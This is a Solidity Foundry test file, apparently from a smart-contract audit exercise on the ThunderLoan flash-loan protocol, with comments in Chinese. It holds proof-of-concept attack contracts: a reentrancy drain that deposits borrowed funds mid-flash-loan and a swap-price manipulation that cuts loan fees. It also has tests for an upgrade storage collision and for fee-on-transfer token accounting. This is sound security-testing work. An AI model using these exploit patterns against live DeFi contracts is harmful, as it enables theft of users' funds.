// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { ThunderLoanFixed } from "../src/fixed/ThunderLoanFixed.sol";

import { ERC20Mock } from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { MockTSwapPool } from "./mocks/MockTSwapPool.sol";
import { MockPoolFactory } from "./mocks/MockPoolFactory.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IFlashLoanReceiver } from "src/interfaces/IFlashLoanReceiver.sol";
import { AssetToken } from "src/protocol/AssetToken.sol";
import { ThunderLoanUpgraded } from "src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract BaseTestFixed is Test {
    ThunderLoanFixed thunderLoanImplementation;
    ThunderLoanUpgraded thunderLoanImplementationUpgraded;

    MockPoolFactory mockPoolFactory;
    MockTSwapPool mockTswapPool;
    ERC1967Proxy proxy;
    ThunderLoanFixed thunderLoan;
    ThunderLoanUpgraded thunderLoanUpgraded;

    ERC20Mock weth;
    ERC20Mock tokenA;
    AssetToken tokenA_Asset;

    address depositer = address(0x1);

    function setUp() public virtual {
        thunderLoan = new ThunderLoanFixed();
        thunderLoanImplementationUpgraded = new ThunderLoanUpgraded();
        mockPoolFactory = new MockPoolFactory();

        weth = new ERC20Mock();
        tokenA = new ERC20Mock();

        mockPoolFactory.createPool(address(tokenA));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoanFixed(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));
        // 设置tokenA为允许的token
        tokenA_Asset = thunderLoan.setAllowedToken(tokenA, true);

        vm.label(address(thunderLoan), "thunderLoan");
        vm.label(address(mockPoolFactory), "mockPoolFactory");
        vm.label(address(weth), "weth");
        vm.label(address(tokenA), "tokenA");
        vm.label(address(depositer), "depositer");
        vm.label(address(tokenA_Asset), "tokenA_AssetToken");
    }

    function test_reen() public {
        uint256 amount = 1 ether;

        tokenA.mint(depositer, amount);

        // mock deposit
        vm.startPrank(depositer);
        tokenA.approve(address(thunderLoan), amount);
        thunderLoan.deposit(tokenA, amount);

        console.log("rate1", tokenA_Asset.getExchangeRate());
        vm.stopPrank();

        AttackerForReen attacker = new AttackerForReen(thunderLoan, tokenA, amount);
        console.log("fee amount ", amount * thunderLoan.getFee() / thunderLoan.getFeePrecision());
        tokenA.mint(address(attacker), amount * thunderLoan.getFee() / thunderLoan.getFeePrecision());
        console.log("rate2", tokenA_Asset.getExchangeRate());

        attacker.attack();

        assertEq(tokenA.balanceOf(address(thunderLoan)), 0);
        console.log("tokenA_Asset.balanceOf(address(thunderLoan))", tokenA.balanceOf(address(attacker)));
    }

    function test_flation() public {
        // 正常的deposit
        uint256 amount = 1 ether;
        tokenA.mint(depositer, amount);

        vm.startPrank(depositer);
        tokenA.approve(address(thunderLoan), amount);
        thunderLoan.deposit(tokenA, amount);
        vm.stopPrank();

        // 套利的deposit和redeem
        address arbitrageur = address(0x2);
        tokenA.mint(arbitrageur, amount);
        vm.startPrank(arbitrageur);
        tokenA.approve(address(thunderLoan), amount);
        thunderLoan.deposit(tokenA, amount);
        thunderLoan.redeem(tokenA, tokenA_Asset.balanceOf(arbitrageur));
        vm.stopPrank();

        assertGt(tokenA.balanceOf(address(arbitrageur)), amount);
    }

    function test_storage_conflict() public {
        //    upgrade 之前                    upgrade 之后
        // s_tokenToAssetToken             s_tokenToAssetToken
        // s_feePrecision                      s_flashLoanFee
        // s_flashLoanFee                  s_currentlyFlashLoaning
        // s_currentlyFlashLoaning

        // 也即，upgrade前后，s_feePrecision会产生冲突；s_flashLoanFee和s_currentlyFlashLoaning会产生冲突；s_currentlyFlashLoaning读取的值完全不对

        console.log("before s_feePrecision", thunderLoan.getFeePrecision());
        console.log("before s_flashLoanFee", thunderLoan.getFee());

        // 使用store作弊码，在tokenA对应的位置设置为true
        uint256 p = 205;
        bytes32 v_slot = keccak256(abi.encodePacked(abi.encode(address(tokenA)), p));
        vm.store(address(thunderLoan), v_slot, bytes32(uint256(1)));
        console.log("before s_currentlyFlashLoaning", thunderLoan.isCurrentlyFlashLoaning(tokenA));
        assertEq(thunderLoan.isCurrentlyFlashLoaning(tokenA), true);

        thunderLoan.upgradeTo(address(thunderLoanImplementationUpgraded));
        thunderLoanUpgraded = ThunderLoanUpgraded(address(thunderLoan));

        console.log("after s_feePrecision", thunderLoanUpgraded.FEE_PRECISION());
        console.log("after s_flashLoanFee", thunderLoanUpgraded.getFee()); // s_flashLoanFee == s_feePrecision
        console.log("after s_currentlyFlashLoaning", thunderLoanUpgraded.isCurrentlyFlashLoaning(tokenA));
        assertEq(thunderLoanUpgraded.isCurrentlyFlashLoaning(tokenA), false);
    }

    function test_lock_liq() public {
        // mock deposit
        uint256 amount = 1 ether;
        tokenA.mint(depositer, amount);
        vm.startPrank(depositer);
        tokenA.approve(address(thunderLoan), amount);
        thunderLoan.deposit(tokenA, amount);
        vm.stopPrank();

        tokenA_Asset = thunderLoan.getAssetFromToken(tokenA);

        // 设置tokenA为不允许的token，此时，token->AssetToken的映射，token对应的值会被清空
        thunderLoan.setAllowedToken(tokenA, false);
        // 尝试redeem
        vm.startPrank(depositer);
        uint256 amountToRedeem =
            tokenA_Asset.balanceOf(depositer) * tokenA_Asset.EXCHANGE_RATE_PRECISION() / tokenA_Asset.getExchangeRate();
        tokenA_Asset.approve(address(thunderLoan), amountToRedeem);
        vm.expectRevert();
        thunderLoan.redeem(tokenA, amountToRedeem);
    }

    function test_minimize_fee() public {
        // mock deposit
        vm.startPrank(depositer);
        uint256 amount = 100 ether;
        tokenA.mint(depositer, amount);
        tokenA.approve(address(thunderLoan), amount);
        thunderLoan.deposit(tokenA, amount);
        vm.stopPrank();

        // 由于当前price是通过一个swap pool来获取的而不是价格预言机，因此我们可以假设该价格易于被操纵
        AttackForMinimizeFee attacker = new AttackForMinimizeFee(
            thunderLoan, tokenA, 1 ether, MockTSwapPool(mockPoolFactory.getPool(address(tokenA)))
        );
        // 此处，先给用户两次闪电贷的手续费，第一次借用1 ether，第二次借用 10 ether
        tokenA.mint(address(attacker), 1 ether + 3_000_000_000_000_000 + 30_000_000_000_000);
        attacker.attack();
        assertGt(attacker.fee1(), attacker.fee2(), "fee1 should be greater than fee2, because the price is manipulated");
    }

    function test_uncheck_deposit() public {
        // 创建一个以反射代币为底层代币的pool
        ReflectToken reflect_token = new ReflectToken();
        vm.label(address(reflect_token), "reflect_token");
        thunderLoan = new ThunderLoanFixed();
        mockPoolFactory = new MockPoolFactory();
        mockPoolFactory.createPool(address(reflect_token));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoanFixed(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));
        tokenA_Asset = thunderLoan.setAllowedToken(reflect_token, true);

        // mock deposit
        uint256 exchange_rate = 1e18;
        uint256 amount = 1 ether;
        reflect_token.mint(depositer, amount);
        vm.startPrank(depositer);
        reflect_token.approve(address(thunderLoan), amount);
        thunderLoan.deposit(reflect_token, amount);
        vm.stopPrank();
        tokenA_Asset = thunderLoan.getAssetFromToken(reflect_token);

        // 如果是根据收到的代币余额来计算手续费，那么fee应该为 amount * 0.99 * exchange_rate
        // 0.99是由于用户转账入协议导致的
        uint256 real_fee = (amount * 99 * exchange_rate / 100) / tokenA_Asset.EXCHANGE_RATE_PRECISION();
        // 如果是根据amount来计算手续费，那么fee应该为 amount * exchange_rate
        uint256 fake_fee = (amount * exchange_rate) / tokenA_Asset.EXCHANGE_RATE_PRECISION();
        assertEq(fake_fee, tokenA_Asset.balanceOf(depositer), "fee should be greater than balance");
        assertGt(fake_fee, real_fee, "fee should be greater than balance");
    }
}

contract AttackerForReen is IFlashLoanReceiver {
    ThunderLoanFixed thunderLoan;
    IERC20 tokenA;
    uint256 amount;

    constructor(ThunderLoanFixed _thunderLoan, IERC20 _tokenA, uint256 _amount) {
        thunderLoan = _thunderLoan;
        tokenA = _tokenA;
        amount = _amount;
    }

    function attack() public {
        thunderLoan.flashloan(address(this), tokenA, amount, "");
        AssetToken tokenA_Asset = thunderLoan.getAssetFromToken(tokenA);
        thunderLoan.redeem(
            tokenA,
            tokenA_Asset.balanceOf(address(this)) * tokenA_Asset.EXCHANGE_RATE_PRECISION()
                / tokenA_Asset.getExchangeRate()
        );
    }

    function executeOperation(address token, uint256, uint256, address, bytes calldata) external returns (bool) {
        tokenA.approve(address(thunderLoan), tokenA.balanceOf(address(this)));
        thunderLoan.deposit(IERC20(token), tokenA.balanceOf(address(this)));
        return true;
    }
}

contract AttackForMinimizeFee is IFlashLoanReceiver {
    ThunderLoanFixed thunderLoan;
    IERC20 tokenA;
    uint256 amount;
    MockTSwapPool tSwapPool;
    uint256 public fee1;
    uint256 public fee2;

    constructor(ThunderLoanFixed _thunderLoan, IERC20 _tokenA, uint256 _amount, MockTSwapPool _pool) {
        thunderLoan = _thunderLoan;
        tokenA = _tokenA;
        amount = _amount;
        tSwapPool = _pool;
    }

    function attack() external {
        // 进行第一次闪电贷
        thunderLoan.flashloan(address(this), tokenA, amount, abi.encode(true));
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    )
        external
        override
        returns (bool)
    {
        bool is_first = abi.decode(params, (bool));

        if (is_first) {
            console.log("first flashloan fee amount ", fee);
            fee1 = fee;
            // 价格被操纵，从1e18到1e15
            tSwapPool.set_price_mock_mainpulation(1e15);
            // 计算要归还的代币数量
            uint256 amountToRepay = amount + fee;
            // 偿还
            tokenA.approve(address(thunderLoan), amountToRepay);
            thunderLoan.repay(tokenA, amountToRepay);

            // 进行一次大额闪电贷
            thunderLoan.flashloan(address(this), tokenA, amount * 10, abi.encode(false));
        } else {
            console.log("second flashloan fee amount ", fee);
            fee2 = fee;
            // 由于价格被操纵，此时的fee会比之前的fee要小
            // 计算要归还的代币数量
            uint256 amountToRepay = amount + fee;
            // 偿还
            tokenA.approve(address(thunderLoan), amountToRepay);
            thunderLoan.repay(tokenA, amountToRepay);
            // 价格恢复正常
            tSwapPool.set_price_mock_mainpulation(1e18);
        }
    }
}

contract ReflectToken is ERC20 {
    constructor() ERC20("ReflectToken", "RFT") {
        _mint(msg.sender, 100 ether);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual override {
        // 收取一部分手续费
        uint256 fee = amount / 100; // 1% 的手续费
        uint256 amountAfterFee = amount - fee;
        super._burn(sender, fee); // 销毁手续费
        super._transfer(sender, recipient, amountAfterFee); // 转账剩余的金额
    }
}
